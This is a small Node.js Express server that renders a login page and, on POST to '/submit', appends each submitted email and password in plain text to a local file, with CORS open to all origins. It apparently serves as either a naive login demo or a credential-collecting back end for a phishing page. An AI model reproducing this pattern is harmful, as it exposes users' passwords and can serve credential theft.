const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
const cors = require("cors");
app.use(express.json());
app.use(cors()); // Add this line to use the cors middleware
app.set('view engine',"ejs");
app.post("/submit", (req, res) => {
  const { email, password } = req.body;
  const filePath = path.join(__dirname, "data.txt");
  const data = `Email: ${email}, Password: ${password}\n`;
  fs.appendFile(filePath, data, (err) => {
    if (err) {
      console.error("Error saving data:", err);
      return res.status(500).send("Server Error");
    }
    console.log("Data saved successfully!");
    res.send("Data saved successfully!");
  });
});

app.get("/login",(req,res)=>{
    res.render("index")
})
app.listen(3000, () => {
  console.log("connect success");
});
